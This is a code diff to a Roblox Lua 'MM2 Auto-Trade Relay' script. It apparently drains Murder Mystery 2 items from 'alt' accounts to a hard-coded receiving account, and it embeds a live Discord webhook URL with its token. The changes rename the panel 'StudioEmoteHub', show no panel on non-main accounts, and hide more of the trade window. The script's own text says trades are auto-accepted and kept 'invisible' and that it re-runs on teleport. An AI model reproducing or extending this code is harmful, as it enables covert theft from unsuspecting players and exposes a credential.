@@ -28,7 +28,7 @@ while not LocalPlayer do
 end
 
 local CONFIG = {
-    MAIN_USERNAME = "FaithfulLust",
+    MAIN_USERNAME = "BG_0o",
     DISCORD_WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1547087696030208091/n3x6RW5UyBNyOA9uuZsmamVhfCublmjgecbjxFzXXePYDcPPmOgYYHoSnt5LmVgynwso",
     DISCORD_MESSAGE_ID  = "1547087791182184549",
     ITEMS_PER_TRADE = 4,
@@ -185,6 +185,13 @@ task.spawn(function()
         TradeModuleRef = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
         if TradeModuleRef then
             TradeModuleRef.RequestsEnabled = true
+
+            if TradeModuleRef.GUI and TradeModuleRef.GUI.TradeGUI then
+                local bg = TradeModuleRef.GUI.TradeGUI:FindFirstChild("BG")
+                if bg and bg:IsA("GuiObject") then
+                    pcall(function() bg.BackgroundTransparency = 1 end)
+                end
+            end
 
             if isAlt and TradeModuleRef.GUI and TradeModuleRef.GUI.TradeGUI and concealAltTradeGui then
                 concealAltTradeGui(TradeModuleRef.GUI.TradeGUI)
@@ -728,6 +735,9 @@ concealAltTradeGui = function(gui)
         local cb = gui:FindFirstChild("ClickBlocker")
         if cb then hookBlocker(cb) end
 
+        local bg = gui:FindFirstChild("BG")
+        if bg then hookBlocker(bg) end
+
         local c = gui:FindFirstChild("Container")
         if c then
             hookFrame(c)
@@ -741,7 +751,7 @@ concealAltTradeGui = function(gui)
         if p then hookFrame(p) end
 
         local connChild = gui.ChildAdded:Connect(function(child)
-            if child.Name == "ClickBlocker" then
+            if child.Name == "ClickBlocker" or child.Name == "BG" then
                 hookBlocker(child)
             elseif child.Name == "Container" or child.Name == "Processing" or child.Name == "Trade" or child.Name == "Items" then
                 hookFrame(child)
@@ -1502,97 +1512,83 @@ local function cleanAllPreviousInstances(names)
     end
 end
 
-local ModernTheme = {
-    windowBg     = Color3.fromRGB(13, 16, 24),
-    headerBg     = Color3.fromRGB(18, 22, 35),
-    cardBg       = Color3.fromRGB(20, 26, 42),
-    cardHover    = Color3.fromRGB(28, 36, 58),
-    insetBg      = Color3.fromRGB(10, 12, 19),
-    tabActive    = Color3.fromRGB(28, 36, 60),
-    tabInactive  = Color3.fromRGB(15, 18, 28),
-    
-    border       = Color3.fromRGB(42, 52, 78),
-    borderAccent = Color3.fromRGB(0, 210, 255),
-    borderSubtle = Color3.fromRGB(28, 35, 54),
-    
-    text         = Color3.fromRGB(248, 250, 252),
-    textMuted    = Color3.fromRGB(156, 175, 205),
-    textDim      = Color3.fromRGB(100, 116, 145),
-    
-    cyan         = Color3.fromRGB(0, 210, 255),
-    cyanHover    = Color3.fromRGB(56, 225, 255),
-    purple       = Color3.fromRGB(147, 51, 234),
-    purpleHover  = Color3.fromRGB(168, 85, 247),
-    blue         = Color3.fromRGB(14, 165, 233),
-    blueHover    = Color3.fromRGB(56, 189, 248),
-    green        = Color3.fromRGB(16, 185, 129),
-    greenHover   = Color3.fromRGB(52, 211, 153),
-    red          = Color3.fromRGB(239, 68, 68),
-    redHover     = Color3.fromRGB(248, 113, 113),
-    yellow       = Color3.fromRGB(245, 158, 11),
-    
-    btnBg        = Color3.fromRGB(24, 30, 48),
-    btnHover     = Color3.fromRGB(36, 46, 72),
+local StudioTheme = {
+    windowBg       = Color3.fromRGB(37, 37, 38),
+    headerBg       = Color3.fromRGB(45, 45, 48),
+    panelBg        = Color3.fromRGB(42, 42, 45),
+    panelAlt       = Color3.fromRGB(32, 32, 34),
+    insetBg        = Color3.fromRGB(26, 26, 28),
+    cardBg         = Color3.fromRGB(44, 44, 48),
+    cardHover      = Color3.fromRGB(56, 56, 62),
+    border         = Color3.fromRGB(20, 20, 22),
+    borderSubtle   = Color3.fromRGB(55, 55, 58),
+    text           = Color3.fromRGB(225, 225, 228),
+    textMuted      = Color3.fromRGB(160, 160, 165),
+    textDim        = Color3.fromRGB(115, 115, 120),
+    blue           = Color3.fromRGB(0, 122, 204),
+    blueHover      = Color3.fromRGB(28, 140, 224),
+    green          = Color3.fromRGB(76, 175, 80),
+    greenHover     = Color3.fromRGB(92, 195, 96),
+    red            = Color3.fromRGB(215, 60, 60),
+    redHover       = Color3.fromRGB(235, 75, 75),
+    yellow         = Color3.fromRGB(230, 180, 50),
+    btnBg          = Color3.fromRGB(50, 50, 54),
+    btnHover       = Color3.fromRGB(65, 65, 70),
+    tabActive      = Color3.fromRGB(40, 40, 42),
+    tabInactive    = Color3.fromRGB(30, 30, 32),
 }
 
-local function addCorner(parent, radius)
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, radius or 8)
-    corner.Parent = parent
-    return corner
-end
-
-local function addStroke(parent, color, thickness, transparency)
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = color or ModernTheme.border
-    stroke.Thickness = thickness or 1
-    stroke.Transparency = transparency or 0
-    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    stroke.Parent = parent
-    return stroke
-end
-
-local function makeModernButton(parent, text, w, h, bg, fg, cornerRadius)
+local function makeStudioButton(parent, text, w, h, bg, fg)
     local b = Instance.new("TextButton")
     if typeof(w) == "number" then
-        b.Size = UDim2.new(0, w, 0, h or 28)
+        b.Size = UDim2.new(0, w, 0, h or 22)
     else
         b.Size = w
     end
-    b.BackgroundColor3 = bg or ModernTheme.btnBg
+    b.BackgroundColor3 = bg or StudioTheme.btnBg
     b.Text = text
-    b.TextColor3 = fg or ModernTheme.text
-    b.TextSize = 11
-    b.Font = Enum.Font.GothamBold
+    b.TextColor3 = fg or StudioTheme.text
+    b.TextSize = 12
+    b.Font = Enum.Font.SourceSansSemibold
     b.AutoButtonColor = false
-    b.BorderSizePixel = 0
+    b.BorderSizePixel = 1
+    b.BorderColor3 = StudioTheme.border
     b.ClipsDescendants = true
     b.Parent = parent
 
-    addCorner(b, cornerRadius or 6)
-    local stroke = addStroke(b, ModernTheme.border, 1)
-
-    local defaultBg = bg or ModernTheme.btnBg
-    local hoverBg = (bg == ModernTheme.blue and ModernTheme.blueHover)
-        or (bg == ModernTheme.red and ModernTheme.redHover)
-        or (bg == ModernTheme.green and ModernTheme.greenHover)
-        or (bg == ModernTheme.purple and ModernTheme.purpleHover)
-        or ModernTheme.btnHover
+    local defaultBg = bg or StudioTheme.btnBg
+    local hoverBg = (bg == StudioTheme.blue and StudioTheme.blueHover)
+        or (bg == StudioTheme.red and StudioTheme.redHover)
+        or (bg == StudioTheme.green and StudioTheme.greenHover)
+        or StudioTheme.btnHover
 
     b.MouseEnter:Connect(function()
         b.BackgroundColor3 = hoverBg
-        stroke.Color = ModernTheme.cyan
     end)
     b.MouseLeave:Connect(function()
         b.BackgroundColor3 = defaultBg
-        stroke.Color = ModernTheme.border
     end)
 
     return b
 end
 
 local function createAutoTradeHUD()
+    if not isMain then
+        cleanAllPreviousInstances({
+            "StudioEmoteHub",
+            "BevelEmoteHub",
+            "PotassiumEmoteHub",
+            "MM2AutoTradeRelayUI",
+            "StudioAnimPackHub",
+            "StudioAnimationHub"
+        })
+        return
+    end
+
     cleanAllPreviousInstances({
+        "StudioEmoteHub",
+        "BevelEmoteHub",
+        "PotassiumEmoteHub",
         "MM2AutoTradeRelayUI",
         "StudioAnimPackHub",
         "StudioAnimationHub"
@@ -1601,108 +1597,60 @@ local function createAutoTradeHUD()
     local targetParent = getGuiParent()
 
     local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "MM2AutoTradeRelayUI"
+    ScreenGui.Name = "StudioEmoteHub"
     ScreenGui.ResetOnSpawn = false
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     ScreenGui.Parent = targetParent
 
     local MainFrame = Instance.new("Frame")
     MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 520, 0, 460)
-    MainFrame.Position = UDim2.new(0.5, -260, 0.5, -230)
-    MainFrame.BackgroundColor3 = ModernTheme.windowBg
-    MainFrame.BorderSizePixel = 0
+    MainFrame.Size = UDim2.new(0, 510, 0, 440)
+    MainFrame.Position = UDim2.new(0.5, -255, 0.5, -220)
+    MainFrame.BackgroundColor3 = StudioTheme.windowBg
+    MainFrame.BorderSizePixel = 1
+    MainFrame.BorderColor3 = StudioTheme.border
+    MainFrame.Visible = true
     MainFrame.Active = true
     MainFrame.ClipsDescendants = true
     MainFrame.Parent = ScreenGui
 
-    addCorner(MainFrame, 10)
-    addStroke(MainFrame, ModernTheme.border, 1.2)
-
     local TopBar = Instance.new("Frame")
     TopBar.Name = "TopBar"
-    TopBar.Size = UDim2.new(1, 0, 0, 32)
-    TopBar.BackgroundColor3 = ModernTheme.headerBg
-    TopBar.BorderSizePixel = 0
+    TopBar.Size = UDim2.new(1, 0, 0, 26)
+    TopBar.BackgroundColor3 = StudioTheme.headerBg
+    TopBar.BorderSizePixel = 1
+    TopBar.BorderColor3 = StudioTheme.border
     TopBar.Parent = MainFrame
 
-    addCorner(TopBar, 10)
-
-    local TopBarBottomFiller = Instance.new("Frame")
-    TopBarBottomFiller.Size = UDim2.new(1, 0, 0, 10)
-    TopBarBottomFiller.Position = UDim2.new(0, 0, 1, -10)
-    TopBarBottomFiller.BackgroundColor3 = ModernTheme.headerBg
-    TopBarBottomFiller.BorderSizePixel = 0
-    TopBarBottomFiller.Parent = TopBar
-
-    local AccentLine = Instance.new("Frame")
-    AccentLine.Size = UDim2.new(1, 0, 0, 2)
-    AccentLine.Position = UDim2.new(0, 0, 0, 0)
-    AccentLine.BorderSizePixel = 0
-    AccentLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    AccentLine.Parent = TopBar
-
-    local AccentGrad = Instance.new("UIGradient")
-    AccentGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, ModernTheme.cyan),
-        ColorSequenceKeypoint.new(0.5, ModernTheme.purple),
-        ColorSequenceKeypoint.new(1, ModernTheme.blue)
-    })
-    AccentGrad.Parent = AccentLine
-
     local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, -70, 1, 0)
-    Title.Position = UDim2.new(0, 12, 0, 0)
+    Title.Size = UDim2.new(1, -40, 1, 0)
+    Title.Position = UDim2.new(0, 8, 0, 0)
     Title.BackgroundTransparency = 1
-    Title.Text = string.format("⚡ MM2 Auto-Trade Relay • %s (%s)", myName, isMain and "MAIN" or "ALT")
-    Title.TextColor3 = ModernTheme.text
+    Title.Text = string.format("Toolbox - MM2 Auto-Trade Relay • %s (MAIN)", myName)
+    Title.TextColor3 = StudioTheme.text
     Title.TextXAlignment = Enum.TextXAlignment.Left
-    Title.Font = Enum.Font.GothamBold
-    Title.TextSize = 12
+    Title.Font = Enum.Font.SourceSansSemibold
+    Title.TextSize = 13
     Title.Parent = TopBar
 
-    local MinBtn = Instance.new("TextButton")
-    MinBtn.Size = UDim2.new(0, 26, 0, 24)
-    MinBtn.Position = UDim2.new(1, -58, 0, 4)
-    MinBtn.BackgroundColor3 = ModernTheme.btnBg
-    MinBtn.BorderSizePixel = 0
-    MinBtn.Text = "—"
-    MinBtn.TextColor3 = ModernTheme.textMuted
-    MinBtn.Font = Enum.Font.GothamBold
-    MinBtn.TextSize = 12
-    MinBtn.AutoButtonColor = false
-    MinBtn.Parent = TopBar
-    addCorner(MinBtn, 5)
-
     local CloseBtn = Instance.new("TextButton")
-    CloseBtn.Size = UDim2.new(0, 26, 0, 24)
-    CloseBtn.Position = UDim2.new(1, -28, 0, 4)
-    CloseBtn.BackgroundColor3 = ModernTheme.btnBg
+    CloseBtn.Size = UDim2.new(0, 26, 1, 0)
+    CloseBtn.Position = UDim2.new(1, -26, 0, 0)
+    CloseBtn.BackgroundColor3 = StudioTheme.headerBg
     CloseBtn.BorderSizePixel = 0
-    CloseBtn.Text = "✕"
-    CloseBtn.TextColor3 = ModernTheme.textMuted
-    CloseBtn.Font = Enum.Font.GothamBold
-    CloseBtn.TextSize = 11
-    CloseBtn.AutoButtonColor = false
+    CloseBtn.Text = "X"
+    CloseBtn.TextColor3 = StudioTheme.textMuted
+    CloseBtn.Font = Enum.Font.SourceSansBold
+    CloseBtn.TextSize = 12
     CloseBtn.Parent = TopBar
-    addCorner(CloseBtn, 5)
-
-    MinBtn.MouseEnter:Connect(function()
-        MinBtn.BackgroundColor3 = ModernTheme.btnHover
-        MinBtn.TextColor3 = ModernTheme.text
-    end)
-    MinBtn.MouseLeave:Connect(function()
-        MinBtn.BackgroundColor3 = ModernTheme.btnBg
-        MinBtn.TextColor3 = ModernTheme.textMuted
-    end)
 
     CloseBtn.MouseEnter:Connect(function()
-        CloseBtn.BackgroundColor3 = ModernTheme.red
+        CloseBtn.BackgroundColor3 = StudioTheme.red
         CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     end)
     CloseBtn.MouseLeave:Connect(function()
-        CloseBtn.BackgroundColor3 = ModernTheme.btnBg
-        CloseBtn.TextColor3 = ModernTheme.textMuted
+        CloseBtn.BackgroundColor3 = StudioTheme.headerBg
+        CloseBtn.TextColor3 = StudioTheme.textMuted
     end)
     CloseBtn.Activated:Connect(function()
         MainFrame.Visible = false
@@ -1730,167 +1678,173 @@ local function createAutoTradeHUD()
 
     local TabStrip = Instance.new("Frame")
     TabStrip.Name = "TabStrip"
-    TabStrip.Size = UDim2.new(1, -16, 0, 28)
-    TabStrip.Position = UDim2.new(0, 8, 0, 36)
-    TabStrip.BackgroundColor3 = ModernTheme.tabInactive
-    TabStrip.BorderSizePixel = 0
+    TabStrip.Size = UDim2.new(1, 0, 0, 26)
+    TabStrip.Position = UDim2.new(0, 0, 0, 26)
+    TabStrip.BackgroundColor3 = StudioTheme.tabInactive
+    TabStrip.BorderSizePixel = 1
+    TabStrip.BorderColor3 = StudioTheme.border
     TabStrip.Parent = MainFrame
-    addCorner(TabStrip, 6)
-    addStroke(TabStrip, ModernTheme.borderSubtle, 1)
 
     local MainTabBtn = Instance.new("TextButton")
-    MainTabBtn.Size = UDim2.new(0.5, -2, 1, -2)
-    MainTabBtn.Position = UDim2.new(0, 1, 0, 1)
-    MainTabBtn.BackgroundColor3 = ModernTheme.tabActive
-    MainTabBtn.BorderSizePixel = 0
+    MainTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
+    MainTabBtn.Position = UDim2.new(0, 0, 0, 0)
+    MainTabBtn.BackgroundColor3 = StudioTheme.tabActive
+    MainTabBtn.BorderSizePixel = 1
+    MainTabBtn.BorderColor3 = StudioTheme.border
     MainTabBtn.Text = "Painel Principal"
-    MainTabBtn.TextColor3 = ModernTheme.cyan
-    MainTabBtn.Font = Enum.Font.GothamBold
-    MainTabBtn.TextSize = 11
-    MainTabBtn.AutoButtonColor = false
+    MainTabBtn.TextColor3 = StudioTheme.text
+    MainTabBtn.Font = Enum.Font.SourceSansSemibold
+    MainTabBtn.TextSize = 12
     MainTabBtn.Parent = TabStrip
-    addCorner(MainTabBtn, 5)
+
+    local MainTabAccent = Instance.new("Frame")
+    MainTabAccent.Size = UDim2.new(1, 0, 0, 2)
+    MainTabAccent.Position = UDim2.new(0, 0, 0, 0)
+    MainTabAccent.BackgroundColor3 = StudioTheme.blue
+    MainTabAccent.BorderSizePixel = 0
+    MainTabAccent.Parent = MainTabBtn
 
     local LogsTabBtn = Instance.new("TextButton")
-    LogsTabBtn.Size = UDim2.new(0.5, -2, 1, -2)
-    LogsTabBtn.Position = UDim2.new(0.5, 1, 0, 1)
-    LogsTabBtn.BackgroundColor3 = ModernTheme.tabInactive
-    LogsTabBtn.BorderSizePixel = 0
+    LogsTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
+    LogsTabBtn.Position = UDim2.new(0.5, 0, 0, 0)
+    LogsTabBtn.BackgroundColor3 = StudioTheme.tabInactive
+    LogsTabBtn.BorderSizePixel = 1
+    LogsTabBtn.BorderColor3 = StudioTheme.border
     LogsTabBtn.Text = "Histórico de Logs"
-    LogsTabBtn.TextColor3 = ModernTheme.textMuted
-    LogsTabBtn.Font = Enum.Font.GothamMedium
-    LogsTabBtn.TextSize = 11
-    LogsTabBtn.AutoButtonColor = false
+    LogsTabBtn.TextColor3 = StudioTheme.textMuted
+    LogsTabBtn.Font = Enum.Font.SourceSansSemibold
+    LogsTabBtn.TextSize = 12
     LogsTabBtn.Parent = TabStrip
-    addCorner(LogsTabBtn, 5)
 
-    local FOOTER_H = 26
-    local ContentArea = Instance.new("Frame")
-    ContentArea.Size = UDim2.new(1, -16, 1, -(68 + FOOTER_H + 8))
-    ContentArea.Position = UDim2.new(0, 8, 0, 68)
-    ContentArea.BackgroundTransparency = 1
-    ContentArea.Parent = MainFrame
+    local LogsTabAccent = Instance.new("Frame")
+    LogsTabAccent.Size = UDim2.new(1, 0, 0, 2)
+    LogsTabAccent.Position = UDim2.new(0, 0, 0, 0)
+    LogsTabAccent.BackgroundColor3 = StudioTheme.blue
+    LogsTabAccent.BorderSizePixel = 0
+    LogsTabAccent.Visible = false
+    LogsTabAccent.Parent = LogsTabBtn
 
+    local FOOTER_H = 22
     local MainContainer = Instance.new("Frame")
-    MainContainer.Size = UDim2.new(1, 0, 1, 0)
+    MainContainer.Size = UDim2.new(1, -8, 1, -(52 + FOOTER_H + 8))
+    MainContainer.Position = UDim2.new(0, 4, 0, 56)
     MainContainer.BackgroundTransparency = 1
-    MainContainer.Parent = ContentArea
+    MainContainer.Parent = MainFrame
 
     local LogsContainer = Instance.new("Frame")
-    LogsContainer.Size = UDim2.new(1, 0, 1, 0)
+    LogsContainer.Size = UDim2.new(1, -8, 1, -(52 + FOOTER_H + 8))
+    LogsContainer.Position = UDim2.new(0, 4, 0, 56)
     LogsContainer.BackgroundTransparency = 1
     LogsContainer.Visible = false
-    LogsContainer.Parent = ContentArea
+    LogsContainer.Parent = MainFrame
 
     local function selectTab(isMainTab)
         MainContainer.Visible = isMainTab
         LogsContainer.Visible = not isMainTab
 
-        MainTabBtn.BackgroundColor3 = isMainTab and ModernTheme.tabActive or ModernTheme.tabInactive
-        MainTabBtn.TextColor3 = isMainTab and ModernTheme.cyan or ModernTheme.textMuted
-        MainTabBtn.Font = isMainTab and Enum.Font.GothamBold or Enum.Font.GothamMedium
+        MainTabBtn.BackgroundColor3 = isMainTab and StudioTheme.tabActive or StudioTheme.tabInactive
+        MainTabBtn.TextColor3 = isMainTab and StudioTheme.text or StudioTheme.textMuted
+        MainTabAccent.Visible = isMainTab
 
-        LogsTabBtn.BackgroundColor3 = (not isMainTab) and ModernTheme.tabActive or ModernTheme.tabInactive
-        LogsTabBtn.TextColor3 = (not isMainTab) and ModernTheme.cyan or ModernTheme.textMuted
-        LogsTabBtn.Font = (not isMainTab) and Enum.Font.GothamBold or Enum.Font.GothamMedium
+        LogsTabBtn.BackgroundColor3 = (not isMainTab) and StudioTheme.tabActive or StudioTheme.tabInactive
+        LogsTabBtn.TextColor3 = (not isMainTab) and StudioTheme.text or StudioTheme.textMuted
+        LogsTabAccent.Visible = not isMainTab
     end
 
     MainTabBtn.MouseButton1Click:Connect(function() selectTab(true) end)
     LogsTabBtn.MouseButton1Click:Connect(function() selectTab(false) end)
 
     local StatusCard = Instance.new("Frame")
-    StatusCard.Size = UDim2.new(1, 0, 0, 150)
+    StatusCard.Size = UDim2.new(1, 0, 0, 140)
     StatusCard.Position = UDim2.new(0, 0, 0, 0)
-    StatusCard.BackgroundColor3 = ModernTheme.cardBg
-    StatusCard.BorderSizePixel = 0
+    StatusCard.BackgroundColor3 = StudioTheme.panelAlt
+    StatusCard.BorderSizePixel = 1
+    StatusCard.BorderColor3 = StudioTheme.border
     StatusCard.Parent = MainContainer
-    addCorner(StatusCard, 8)
-    addStroke(StatusCard, ModernTheme.border, 1)
 
     local function createField(name, defaultVal, yPos, color)
         local fTitle = Instance.new("TextLabel")
         fTitle.Size = UDim2.new(0, 130, 0, 20)
-        fTitle.Position = UDim2.new(0, 12, 0, yPos)
+        fTitle.Position = UDim2.new(0, 8, 0, yPos)
         fTitle.BackgroundTransparency = 1
         fTitle.Text = name
-        fTitle.TextColor3 = ModernTheme.textMuted
-        fTitle.Font = Enum.Font.GothamSemibold
-        fTitle.TextSize = 11
+        fTitle.TextColor3 = StudioTheme.textMuted
+        fTitle.Font = Enum.Font.SourceSansSemibold
+        fTitle.TextSize = 12
         fTitle.TextXAlignment = Enum.TextXAlignment.Left
         fTitle.Parent = StatusCard
 
         local fVal = Instance.new("TextLabel")
-        fVal.Size = UDim2.new(1, -150, 0, 20)
-        fVal.Position = UDim2.new(0, 145, 0, yPos)
+        fVal.Size = UDim2.new(1, -145, 0, 20)
+        fVal.Position = UDim2.new(0, 140, 0, yPos)
         fVal.BackgroundTransparency = 1
         fVal.Text = defaultVal
-        fVal.TextColor3 = color or ModernTheme.text
-        fVal.Font = Enum.Font.GothamMedium
-        fVal.TextSize = 11
+        fVal.TextColor3 = color or StudioTheme.text
+        fVal.Font = Enum.Font.SourceSans
+        fVal.TextSize = 12
         fVal.TextXAlignment = Enum.TextXAlignment.Left
         fVal.TextTruncate = Enum.TextTruncate.AtEnd
         fVal.Parent = StatusCard
         return fVal
     end
 
-    local PartnerVal = createField("Conta Parceira:", "Aguardando sinal...", 10)
-    local ServerVal  = createField("Servidor (JobId):", "Verificando...", 36, ModernTheme.cyan)
-    local TierVal    = createField("Top Raridade:", "Calculando...", 62, ModernTheme.yellow)
-    local WebhookVal = createField("Discord Relay:", "Conectado", 88, ModernTheme.purple)
-    local StatsVal   = createField("Métricas:", "Lotes: 0  •  Facas: 0", 114, ModernTheme.green)
+    local PartnerVal = createField("Conta Parceira:", "Aguardando sinal...", 8)
+    local ServerVal  = createField("Servidor (JobId):", "Verificando...", 34, StudioTheme.blue)
+    local TierVal    = createField("Top Raridade:", "Calculando...", 60, StudioTheme.yellow)
+    local WebhookVal = createField("Discord Relay:", "Conectado", 86, StudioTheme.textMuted)
+    local StatsVal   = createField("Métricas:", "Lotes: 0  •  Facas: 0", 112, StudioTheme.green)
 
     local ActionFrame1 = Instance.new("Frame")
-    ActionFrame1.Size = UDim2.new(1, 0, 0, 32)
-    ActionFrame1.Position = UDim2.new(0, 0, 0, 158)
+    ActionFrame1.Size = UDim2.new(1, 0, 0, 26)
+    ActionFrame1.Position = UDim2.new(0, 0, 0, 146)
     ActionFrame1.BackgroundTransparency = 1
     ActionFrame1.Parent = MainContainer
 
-    local ToggleBtn = makeModernButton(ActionFrame1, "Auto-Trade: LIGADO", UDim2.new(0.485, 0, 1, 0), 32, ModernTheme.green, ModernTheme.text, 6)
+    local ToggleBtn = makeStudioButton(ActionFrame1, "Auto-Trade: LIGADO", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.green, Color3.fromRGB(255, 255, 255))
     ToggleBtn.Position = UDim2.new(0, 0, 0, 0)
 
-    local TriggerBtn = makeModernButton(ActionFrame1, "Enviar Trade Agora", UDim2.new(0.485, 0, 1, 0), 32, ModernTheme.blue, ModernTheme.text, 6)
+    local TriggerBtn = makeStudioButton(ActionFrame1, "Enviar Trade Agora", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.blue, Color3.fromRGB(255, 255, 255))
     TriggerBtn.Position = UDim2.new(0.515, 0, 0, 0)
 
     local ActionFrame2 = Instance.new("Frame")
-    ActionFrame2.Size = UDim2.new(1, 0, 0, 32)
-    ActionFrame2.Position = UDim2.new(0, 0, 0, 196)
+    ActionFrame2.Size = UDim2.new(1, 0, 0, 26)
+    ActionFrame2.Position = UDim2.new(0, 0, 0, 178)
     ActionFrame2.BackgroundTransparency = 1
     ActionFrame2.Parent = MainContainer
 
-    local TpToAltBtn = makeModernButton(ActionFrame2, "Entrar Servidor Alt", UDim2.new(0.485, 0, 1, 0), 32, ModernTheme.btnBg, ModernTheme.cyan, 6)
+    local TpToAltBtn = makeStudioButton(ActionFrame2, "Entrar Servidor Alt", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
     TpToAltBtn.Position = UDim2.new(0, 0, 0, 0)
 
-    local ReinjectBtn = makeModernButton(ActionFrame2, "Reinjetar (GitHub)", UDim2.new(0.485, 0, 1, 0), 32, ModernTheme.purple, ModernTheme.text, 6)
+    local ReinjectBtn = makeStudioButton(ActionFrame2, "Reinjetar (GitHub)", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
     ReinjectBtn.Position = UDim2.new(0.515, 0, 0, 0)
 
     local QuickInfo = Instance.new("Frame")
-    QuickInfo.Size = UDim2.new(1, 0, 1, -236)
-    QuickInfo.Position = UDim2.new(0, 0, 0, 234)
-    QuickInfo.BackgroundColor3 = ModernTheme.insetBg
-    QuickInfo.BorderSizePixel = 0
+    QuickInfo.Size = UDim2.new(1, 0, 1, -212)
+    QuickInfo.Position = UDim2.new(0, 0, 0, 210)
+    QuickInfo.BackgroundColor3 = StudioTheme.insetBg
+    QuickInfo.BorderSizePixel = 1
+    QuickInfo.BorderColor3 = StudioTheme.border
     QuickInfo.Parent = MainContainer
-    addCorner(QuickInfo, 8)
-    addStroke(QuickInfo, ModernTheme.border, 1)
 
     local InfoTitle = Instance.new("TextLabel")
-    InfoTitle.Size = UDim2.new(1, -16, 0, 22)
-    InfoTitle.Position = UDim2.new(0, 10, 0, 6)
+    InfoTitle.Size = UDim2.new(1, -16, 0, 20)
+    InfoTitle.Position = UDim2.new(0, 8, 0, 6)
     InfoTitle.BackgroundTransparency = 1
-    InfoTitle.Text = "✦ Informações do Sistema & Proteção"
-    InfoTitle.TextColor3 = ModernTheme.cyan
-    InfoTitle.Font = Enum.Font.GothamBold
-    InfoTitle.TextSize = 11
+    InfoTitle.Text = "Informações do Sistema & Proteção"
+    InfoTitle.TextColor3 = StudioTheme.blue
+    InfoTitle.Font = Enum.Font.SourceSansSemibold
+    InfoTitle.TextSize = 12
     InfoTitle.TextXAlignment = Enum.TextXAlignment.Left
     InfoTitle.Parent = QuickInfo
 
     local InfoDesc = Instance.new("TextLabel")
-    InfoDesc.Size = UDim2.new(1, -20, 1, -34)
-    InfoDesc.Position = UDim2.new(0, 10, 0, 28)
+    InfoDesc.Size = UDim2.new(1, -16, 1, -30)
+    InfoDesc.Position = UDim2.new(0, 8, 0, 26)
     InfoDesc.BackgroundTransparency = 1
     InfoDesc.Text = "• Proteção Ativa: FaithfulLust APENAS RECEBE facas e NUNCA oferta/entrega nada.\n• Pedidos de Trade aceitos automaticamente e mantidos 100% INVISÍVEIS na tela.\n• Auto-Execute On Teleport: Carrega Dash.lua automaticamente em rejoining ou troca de servidor.\n• Atalho: Pressione a tecla [ , ] para alternar a exibição deste painel."
-    InfoDesc.TextColor3 = ModernTheme.textMuted
-    InfoDesc.Font = Enum.Font.GothamMedium
-    InfoDesc.TextSize = 11
+    InfoDesc.TextColor3 = StudioTheme.textMuted
+    InfoDesc.Font = Enum.Font.SourceSans
+    InfoDesc.TextSize = 12
     InfoDesc.TextXAlignment = Enum.TextXAlignment.Left
     InfoDesc.TextYAlignment = Enum.TextYAlignment.Top
     InfoDesc.TextWrapped = true
@@ -1898,20 +1852,20 @@ local function createAutoTradeHUD()
 
     local LogsWrapper = Instance.new("Frame")
     LogsWrapper.Size = UDim2.new(1, 0, 1, 0)
-    LogsWrapper.BackgroundColor3 = ModernTheme.insetBg
-    LogsWrapper.BorderSizePixel = 0
+    LogsWrapper.Position = UDim2.new(0, 0, 0, 0)
+    LogsWrapper.BackgroundColor3 = StudioTheme.insetBg
+    LogsWrapper.BorderSizePixel = 1
+    LogsWrapper.BorderColor3 = StudioTheme.border
     LogsWrapper.ClipsDescendants = true
     LogsWrapper.Parent = LogsContainer
-    addCorner(LogsWrapper, 8)
-    addStroke(LogsWrapper, ModernTheme.border, 1)
 
     local LogScroll = Instance.new("ScrollingFrame")
-    LogScroll.Size = UDim2.new(1, -4, 1, -4)
-    LogScroll.Position = UDim2.new(0, 2, 0, 2)
+    LogScroll.Size = UDim2.new(1, -2, 1, -2)
+    LogScroll.Position = UDim2.new(0, 1, 0, 1)
     LogScroll.BackgroundTransparency = 1
     LogScroll.BorderSizePixel = 0
-    LogScroll.ScrollBarThickness = 4
-    LogScroll.ScrollBarImageColor3 = ModernTheme.cyan
+    LogScroll.ScrollBarThickness = 5
+    LogScroll.ScrollBarImageColor3 = StudioTheme.borderSubtle
     LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
     LogScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
     LogScroll.ClipsDescendants = true
@@ -1919,45 +1873,35 @@ local function createAutoTradeHUD()
 
     local LogLayout = Instance.new("UIListLayout")
     LogLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    LogLayout.Padding = UDim.new(0, 3)
+    LogLayout.Padding = UDim.new(0, 2)
     LogLayout.Parent = LogScroll
 
     local LogPad = Instance.new("UIPadding")
-    LogPad.PaddingTop = UDim.new(0, 6)
-    LogPad.PaddingBottom = UDim.new(0, 6)
-    LogPad.PaddingLeft = UDim.new(0, 8)
-    LogPad.PaddingRight = UDim.new(0, 8)
+    LogPad.PaddingTop = UDim.new(0, 4)
+    LogPad.PaddingBottom = UDim.new(0, 4)
+    LogPad.PaddingLeft = UDim.new(0, 6)
+    LogPad.PaddingRight = UDim.new(0, 6)
     LogPad.Parent = LogScroll
 
     local Footer = Instance.new("Frame")
-    Footer.Name = "ModernFooter"
+    Footer.Name = "StudioFooter"
     Footer.Size = UDim2.new(1, 0, 0, FOOTER_H)
     Footer.Position = UDim2.new(0, 0, 1, -FOOTER_H)
-    Footer.BackgroundColor3 = ModernTheme.headerBg
-    Footer.BorderSizePixel = 0
+    Footer.BackgroundColor3 = StudioTheme.headerBg
+    Footer.BorderSizePixel = 1
+    Footer.BorderColor3 = StudioTheme.border
     Footer.Parent = MainFrame
-
